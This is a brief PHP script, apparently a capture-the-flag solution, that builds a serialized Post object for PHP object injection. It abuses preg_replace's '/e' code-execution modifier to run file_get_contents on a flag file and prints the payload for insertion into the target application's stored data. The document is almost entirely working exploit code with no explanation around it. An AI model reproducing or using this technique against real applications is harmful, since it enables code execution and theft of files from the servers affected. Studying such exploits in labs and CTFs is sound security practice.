<?php
require_once("steves_list_backup/includes/classes.php");
 
// Malicious filter to hand to preg_replace
$filter = new Filter('/^(.*)/e', 'strtoupper(\\\\1)');
 
// Function we want to execute via preg_replace
$text = "file_get_contents('/home/daedalus/flag.txt',true)";
$text = htmlspecialchars($text);
 
// Not used as far as I can tell
$title = "title";
$title = htmlspecialchars($title);
 
// Create our new Post and serialize it
$post = new Post($title, $text, $filter);
$post_ser = serialize($post);
 
// Append it to the existing data
$ser = 'b:1;\n' .  $post_ser;
echo $ser;
?>